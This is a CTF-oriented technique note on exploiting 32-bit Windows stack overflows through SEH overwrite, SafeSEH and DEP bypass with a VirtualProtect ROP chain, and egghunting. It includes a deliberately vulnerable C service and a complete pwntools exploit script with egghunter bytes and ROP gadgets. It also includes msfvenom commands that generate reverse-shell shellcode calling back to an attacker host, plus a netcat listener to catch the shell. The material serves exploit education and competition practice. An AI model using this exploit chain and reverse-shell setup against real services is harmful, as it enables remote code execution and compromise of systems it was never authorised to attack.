---
title: "Windows Userland Pwn - SEH Overwrite, DEP/ASLR Bypass and Egghunting"
category: pwn
subcategory: windows
type: technique
tags: [windows, seh, seh-overwrite, safeseh, dep, aslr, rop, virtualprotect, egghunter, pop-pop-ret, mona, immunity-debugger, x64dbg, windbg, msfvenom, pwntools, badchars]
difficulty: medium
summary: "The classic Windows stack-overflow toolkit: overwrite the SEH chain, pivot with pop-pop-ret, defeat DEP with a VirtualProtect ROP chain, and find your shellcode with an egghunter."
when_to_use:
  - "The challenge is a Windows service or .exe with a stack buffer overflow"
  - "A direct EIP overwrite is not possible but you can reach the SEH chain"
  - "The payload space is too small and your real shellcode is elsewhere in memory"
  - "DEP is on and you need a ROP chain from a non-ASLR module"
tools: [mona, immunity-debugger, x64dbg, windbg, msfvenom, pwntools, ropper]
related: [heap-write-targets, heap-internals-primer, browser-vm-escape-primer]
---

## TL;DR

Windows userland pwn in CTF is mostly 32-bit: find the offset, check which
mitigations the module has (`!mona modules`), and pick a route. Direct EIP overwrite
with a `jmp esp` if you can; SEH overwrite with `pop pop ret` if the buffer is too
long or a guard page is in the way; a `VirtualProtect` ROP chain if DEP is on; an
egghunter if you only have ~30 bytes of contiguous space.

## Recognise it

- A `.exe` plus a `Makefile`/`build.bat`, or a network service on port 9999 that
  crashes on a long string.
- `!mona modules` shows at least one DLL with `Rebase: False, SafeSEH: False,
  ASLR: False, NXCompat: False` - that module is the intended gadget source.
- The crash overwrites `SEH` rather than `EIP` (the debugger shows the exception
  chain smashed with your pattern).
- `msfvenom` and `pattern_create` appear in the challenge description or hints.

## Vulnerable code shape

```c
/* the canonical Windows CTF service */
#include <winsock2.h>
#include <stdio.h>
#include <string.h>

void handle(SOCKET s)
{
    char buf[256];
    char recvbuf[4096];
    int n = recv(s, recvbuf, sizeof recvbuf, 0);

    if (n > 0) {
        recvbuf[n] = 0;
        strcpy(buf, recvbuf);        /* BUG: unbounded copy into a 256-byte stack buffer */
        printf("got: %s\n", buf);
    }
}

/* the SEH flavour: a try/except that catches the first fault, so the
   exception dispatcher runs with your overwritten handler */
void parse(char *input)
{
    char local[128];
    __try {
        memcpy(local, input, strlen(input));   /* smashes past the SEH frame */
        *(int *)0 = 0;                          /* force an exception */
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        puts("caught");
    }
}
```

## Theory

Targets: x86 (32-bit) Windows 7 - 11. x64 changes the SEH story completely (see
Variants).

### Structured Exception Handling on x86

The SEH chain is a linked list on the stack, headed by `fs:[0]`:

```
struct _EXCEPTION_REGISTRATION_RECORD {
    struct _EXCEPTION_REGISTRATION_RECORD *Next;   /* +0x00, "nSEH" */
    PEXCEPTION_HANDLER Handler;                    /* +0x04, "SEH"  */
};
```

When an exception occurs, `ntdll!KiUserExceptionDispatcher` walks the chain and calls
each `Handler` with this stack:

```
esp+0x00  return address (into ntdll)
esp+0x04  EXCEPTION_RECORD *
esp+0x08  EXCEPTION_REGISTRATION_RECORD *   <- points at YOUR nSEH/SEH
esp+0x0c  CONTEXT *
```

So `pop pop ret` discards the return address and `EXCEPTION_RECORD *`, then `ret`s to
`EXCEPTION_REGISTRATION_RECORD *` - the address of your own **nSEH**. Execution lands
on those 4 bytes, so the standard content is a short jump over the SEH field:

```
nSEH = "\xeb\x06\x90\x90"    ; jmp +6 ; nop ; nop
SEH  = <address of a pop pop ret in a non-SafeSEH module>
```

after which your shellcode begins.

**SafeSEH** registers a table of legal handlers per module and rejects anything else.
Bypass with a `pop pop ret` from a module compiled **without** SafeSEH (`!mona seh`
finds exactly these) or from outside any module (`!mona seh -all`).

**SEHOP** validates the chain's integrity (it must be walkable and terminate at
`ntdll!FinalExceptionHandler`). Keep `nSEH` a valid pointer to a forged chain that
terminates correctly - rarely needed in CTF.

### DEP and the VirtualProtect ROP chain

With DEP (NXCompat) on, your stack shellcode is not executable. The standard fix is a
ROP chain that calls:

```c
BOOL VirtualProtect(LPVOID lpAddress,        /* the stack region holding the shellcode */
                    SIZE_T dwSize,            /* 0x201 is conventional              */
                    DWORD  flNewProtect,      /* 0x40 = PAGE_EXECUTE_READWRITE      */
                    PDWORD lpflOldProtect);   /* a writable address                 */
```

`!mona rop -m <module> -cpb '\x00\x0a\x0d'` generates the chain for you, including
the stack-pivot and the `pushad` trick that sets all four arguments at once.

Alternatives: `VirtualAlloc` + copy, `WriteProcessMemory`, `SetProcessDEPPolicy`
(XP/Vista era), or `NtSetInformationProcess`.

### ASLR

If *any* loaded module has `Rebase: False` / `ASLR: False`, all your gadget addresses
are fixed. In CTF there is essentially always one - a plugin DLL, an old MSVC runtime,
or the main executable itself compiled without `/DYNAMICBASE`.

If everything is ASLR'd, you need a leak (a format string, an info-disclosure in the
protocol) or a partial overwrite.

### Egghunting

When the overflow only gives you ~30 bytes but your real payload sits elsewhere in
memory (a previous request, an environment variable, a heap buffer), use an egghunter:
a small stub that scans memory for an 8-byte tag (`w00tw00t`) and jumps just past it.

The `NtAccessCheckAndAuditAlarm` variant (32 bytes) is the standard:

```asm
loop_inc_page:
    or   dx, 0x0fff          ; page align
loop_inc_one:
    inc  edx                 ; next address
    push edx
    push 0x2                 ; NtAccessCheckAndAuditAlarm
    pop  eax
    int  0x2e                ; returns STATUS_ACCESS_VIOLATION for a bad page
    cmp  al, 0x5
    pop  edx
    je   loop_inc_page       ; unmapped: skip the whole page
    mov  eax, 0x74303077     ; 'w00t'
    mov  edi, edx
    scasd                    ; first half
    jnz  loop_inc_one
    scasd                    ; second half
    jnz  loop_inc_one
    jmp  edi                 ; found: jump to the payload
```

The egg must appear **twice** (`w00tw00t`) so the hunter does not match its own copy
of the tag. `!mona egg -t w00t` emits a ready-made one.

### Bad characters

Almost every protocol chokes on some bytes: `\x00` (strcpy), `\x0a`/`\x0d` (line
parsing), `\x20` (token splitting), and sometimes a protocol delimiter. Find them with
`!mona bytearray -cpb '\x00'` then `!mona compare -f bytearray.bin -a <esp>`.

## Attack

The standard SEH + DEP workflow:

1. **Fuzz**: send increasing lengths until it crashes. Note the length.
2. **Offset**: `msf-pattern_create -l 3000`, send it, read `SEH` in the debugger,
   `msf-pattern_offset -q <value>`. Now you know the offset to `nSEH` and `SEH`.
3. **Bad chars**: `!mona bytearray -cpb '\x00\x0a\x0d'`, send, `!mona compare`.
   Repeat until clean.
4. **Gadget**: `!mona seh -cpb '\x00\x0a\x0d'` -> a `pop pop ret` address in a
   non-SafeSEH, non-ASLR module.
5. **Mitigations**: `!mona modules`. If NXCompat is True on the module your shellcode
   lands in, build the ROP chain: `!mona rop -m <module> -cpb '\x00\x0a\x0d'`
   (it writes `rop_chains.txt` with a ready Python chain).
6. **Payload**: `msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... -b
   '\x00\x0a\x0d' -f python`.
7. **Assemble**: `padding + nSEH(jmp short) + SEH(pop pop ret) + nops + [rop] + shellcode`.
8. **Fire**, catch the shell with `nc -lvnp 4444`.

## Heap state

```text
the stack at the moment of the exception (32-bit)

  buf[0]            <- strcpy writes from here
  ...               "A" * offset
  nSEH   (+0x00)    \xeb\x06\x90\x90     jmp +6
  SEH    (+0x04)    0x10015FA3           pop pop ret (non-SafeSEH module)
  +0x08             \x90\x90\x90\x90     landing pad
  +0x0c             <shellcode ...>

  exception -> KiUserExceptionDispatcher -> call Handler:

    esp+0x00 | ret into ntdll        |  <- pop
    esp+0x04 | EXCEPTION_RECORD *    |  <- pop
    esp+0x08 | EXCEPTION_REG_RECORD *|  <- ret lands on &nSEH

    nSEH = jmp +6 -> skips SEH (4 bytes) plus 2 -> the nop pad -> shellcode


with DEP on, the pad holds a ROP chain instead:

    &nSEH -> jmp +6
          -> [pop/pop/xchg gadget chain ...]
          -> VirtualProtect(lpAddress = esp, dwSize = 0x201,
                            flNewProtect = 0x40 (PAGE_EXECUTE_READWRITE),
                            lpflOldProtect = &writable)
          -> ret into the now-executable shellcode


egghunter layout (small buffer + big payload elsewhere)

  small overflow buffer:   [ padding ][ nSEH ][ SEH ][ 32-byte egghunter ]
  other allocation:        [ "w00tw00t" ][ 400 bytes of real shellcode ]
                              ^ the hunter scans all of memory for this
```

## Exploit

```python
#!/usr/bin/env python3
"""Windows SEH overwrite + DEP bypass, with an egghunter fallback.

Every address below comes from `!mona` against the challenge's own modules -
they are placeholders and MUST be replaced.

Usage:
    ./exploit.py HOST=10.0.0.5 PORT=9999
    ./exploit.py EGG            # use the egghunter variant
    ./exploit.py FINDOFFSET     # send a cyclic pattern instead of the payload
"""
from pwn import args, context, cyclic, cyclic_find, log, p32, remote

context.arch = "i386"
context.os = "windows"

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 9999)

# ---- values from !mona (replace all of these) -----------------------------
OFFSET_TO_NSEH = 968            # msf-pattern_offset -q <SEH value>
POP_POP_RET = 0x10015FA3        # !mona seh -cpb '\x00\x0a\x0d'
VIRTUALPROTECT_PTR = 0x1001BC44  # IAT entry for VirtualProtect in a non-ASLR module
BADCHARS = b"\x00\x0a\x0d"

# ---- ROP gadgets from !mona rop -m <module> ------------------------------
POP_EAX_RET = 0x10015B85        # pop eax ; ret
POP_EBP_RET = 0x10015C4E        # pop ebp ; ret
POP_EBX_RET = 0x10015D1A        # pop ebx ; ret
POP_ECX_RET = 0x10016011        # pop ecx ; ret
POP_EDI_RET = 0x100163DA        # pop edi ; ret
POP_ESI_RET = 0x10016522        # pop esi ; ret
PUSHAD_RET = 0x1001A2B5         # pushad ; ret
XCHG_EAX_ESI_RET = 0x10018C91   # xchg eax, esi ; ret
NEG_EAX_RET = 0x10014D8B        # neg eax ; ret
RET_SLIDE = 0x10015F02          # ret
WRITABLE = 0x10036000           # any writable address for lpflOldProtect


def jmp_short(n):
    """Short relative jump forward by n bytes, padded to 4."""
    assert 0 <= n <= 0x7F
    return bytes([0xEB, n, 0x90, 0x90])


def egghunter(tag=b"w00t"):
    """32-byte NtAccessCheckAndAuditAlarm egghunter (x86, Windows)."""
    assert len(tag) == 4
    return (
        b"\x66\x81\xca\xff\x0f"          # or dx, 0x0fff
        b"\x42"                          # inc edx
        b"\x52"                          # push edx
        b"\x6a\x02"                      # push 2
        b"\x58"                          # pop eax
        b"\xcd\x2e"                      # int 0x2e
        b"\x3c\x05"                      # cmp al, 5
        b"\x5a"                          # pop edx
        b"\x74\xef"                      # je  loop_inc_page
        b"\xb8" + tag +                  # mov eax, 'w00t'
        b"\x8b\xfa"                      # mov edi, edx
        b"\xaf"                          # scasd
        b"\x75\xea"                      # jnz loop_inc_one
        b"\xaf"                          # scasd
        b"\x75\xe7"                      # jnz loop_inc_one
        b"\xff\xe7"                      # jmp edi
    )


def virtualprotect_rop():
    """The classic !mona pushad-style VirtualProtect chain.

    pushad pushes eax ebx ecx edx esp ebp esi edi, so after the `ret` the stack
    reads [edi][esi][ebp][esp][edx][ecx][ebx][eax]. Load each register with the
    argument that lands in the right slot, then `pushad ; ret`:
        edi = ret slide        esi = &VirtualProtect     ebp = return -> shellcode
        esp = lpAddress        ebx = dwSize 0x201        edx = flNewProtect 0x40
        ecx = lpflOldProtect   eax = nop slide
    """
    return b"".join([
        p32(POP_EBP_RET), p32(RET_SLIDE),         # ebp = a ret (return target)
        p32(POP_EBX_RET), p32(0xFFFFFDFF),        # ebx = -0x201
        p32(NEG_EAX_RET),
        p32(POP_EAX_RET), p32(0xFFFFFDFF),
        p32(NEG_EAX_RET),                         # eax = 0x201
        p32(XCHG_EAX_ESI_RET),                    # stash it
        p32(POP_ECX_RET), p32(WRITABLE),          # ecx = lpflOldProtect
        p32(POP_EDI_RET), p32(RET_SLIDE),         # edi = ret slide
        p32(POP_EAX_RET), p32(VIRTUALPROTECT_PTR),
        p32(PUSHAD_RET),
    ])


def seh_prefix():
    """padding + nSEH (jmp over SEH) + SEH (pop pop ret) + the 2 skipped bytes."""
    return (b"A" * OFFSET_TO_NSEH + jmp_short(6) + p32(POP_POP_RET) + b"\x90\x90")


def build_seh_payload(shellcode: bytes, use_rop: bool) -> bytes:
    for b in BADCHARS:
        assert bytes([b]) not in shellcode, "bad char %#x in the shellcode" % b
    body = b"\x90" * 16
    if use_rop:
        body += virtualprotect_rop()
    body += shellcode
    # trailing bytes so the overflow reaches the fault
    return seh_prefix() + body + b"C" * 200


def build_egg_payload(real_shellcode: bytes):
    """Small buffer carries the hunter; the egg + payload go in a separate send."""
    payload = seh_prefix() + b"\x90" * 8 + egghunter() + b"C" * 100
    egg_blob = b"w00tw00t" + real_shellcode
    return payload, egg_blob


# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
#          -b '\x00\x0a\x0d' -f python -v SHELLCODE
SHELLCODE = (
    b"\xdb\xc0\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x52\xbf\x51\x4d\x29"
    b"\x5c\x31\x7a\x17\x83\xc2\x04\x03\x7a\x13\xaf\xdc\xa0\xe3\xb6"
    # ... truncated for the file; regenerate with msfvenom for the real run
)


def main():
    io = remote(HOST, PORT)

    if args.FINDOFFSET:
        pat = cyclic(3000, n=4)
        log.info("sending a %d-byte cyclic pattern", len(pat))
        io.send(pat)
        log.info("read SEH in the debugger, then: cyclic_find(value, n=4)")
        log.info("example: %d", cyclic_find(b"aaya", n=4))
        io.close()
        return

    if args.EGG:
        payload, egg_blob = build_egg_payload(SHELLCODE)
        log.info("egg %d bytes, hunter payload %d bytes",
                 len(egg_blob), len(payload))
        io.send(egg_blob)
        io.send(payload)
    else:
        payload = build_seh_payload(SHELLCODE, use_rop=not args.NODEP)
        log.info("sending %d bytes", len(payload))
        io.send(payload)

    log.success("payload away - check your listener (nc -lvnp 4444)")
    io.close()


if __name__ == "__main__":
    main()
```

```bash
#!/bin/sh
# The supporting command line, run from Linux against a Windows target.

# shellcode that avoids the bad characters
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
         -b '\x00\x0a\x0d' -f python -v SHELLCODE

# offsets, the pwntools way (n=4 for 32-bit)
python3 -c "from pwn import *; print(cyclic(3000, n=4).decode('latin1'))"
python3 -c "from pwn import *; print(cyclic_find(0x41326641, n=4))"

# gadgets from a copy of the DLL, if you prefer ropper to mona
ropper --file libspp.dll --search "pop ??? ; pop ??? ; ret"
ropper --file libspp.dll --search "pushad"

# catch the shell
nc -lvnp 4444
```

And the WinDbg / Immunity side:

```text
!mona config -set workingfolder c:\mona\%p
!mona modules                                 # SafeSEH / ASLR / NXCompat per module
!mona seh -cpb '\x00\x0a\x0d'                 # pop pop ret candidates
!mona bytearray -cpb '\x00\x0a\x0d'
!mona compare -f c:\mona\bytearray.bin -a <esp>
!mona rop -m libspp.dll -cpb '\x00\x0a\x0d'   # writes rop_chains.txt
!mona egg -t w00t
!mona jmp -r esp -cpb '\x00\x0a\x0d'          # jmp esp, if EIP is reachable
0:000> !exchain                               # WinDbg: the SEH chain
```

## Variants & pitfalls

- **x64 has no stack-based SEH.** 64-bit Windows uses table-based exception handling
  (`.pdata`/`RUNTIME_FUNCTION`), so there is no chain on the stack to overwrite. On
  x64 you go for the return address, a vtable, or a pivot, and DEP is always on.
- **`jmp esp` first.** If the saved EIP is reachable and DEP is off, a direct overwrite
  with a `jmp esp` gadget is one step instead of five. `!mona jmp -r esp`.
- **The `\x0a` / `\x0d` problem.** Many services split on newlines; if your gadget
  address contains one you must find another.
- **Stack room for the decoder.** After a SEH pivot, a `shikata_ga_nai` stub needs
  ~200 bytes below `esp` to unpack. Add padding or an `add esp, -0x500` gadget.
- **The egg must be twice.** `w00tw00t`, not `w00t`, and the hunter must not contain it.
- **`int 0x2e` vs `syscall`.** The `NtAccessCheckAndAuditAlarm` hunter uses `int 0x2e`
  (x86 up to Windows 10). On WOW64 use mona's `-wow64` variant.
- **Unicode services** need a venetian payload; `!mona ... -cm unicode`.
- **Service restarts** let you brute-force a partial overwrite of an ASLR'd address.

## Debugging

```text
Immunity> File -> Attach -> <process> ; F9
!mona findmsp -distance 3000        # which registers/pointers your pattern reached
!exchain                            # (WinDbg) the SEH chain, before and after
!mona modules                       # the mitigation matrix for every module
!mona seh                           # usable pop-pop-ret addresses
x64dbg> Memory Map                  # module protections
x64dbg> Search -> Pattern           # gadget hunting
```

## Tools

- `mona.py` inside Immunity Debugger or WinDbg (`!py mona`) - the single most
  important tool here.
- `x64dbg` for a modern UI, `WinDbg` for `!exchain` and kernel-adjacent work.
- `msfvenom` for shellcode with bad-character avoidance.
- `pwntools` (`cyclic`, `cyclic_find`, `p32`) and `ropper` from Linux.

## References

- Microsoft documentation for `VirtualProtect` and structured exception handling.
- The `mona.py` documentation from Corelan.
- `NtAccessCheckAndAuditAlarm` egghunter, from Matt Miller's "Safely Searching Process
  Virtual Address Space".
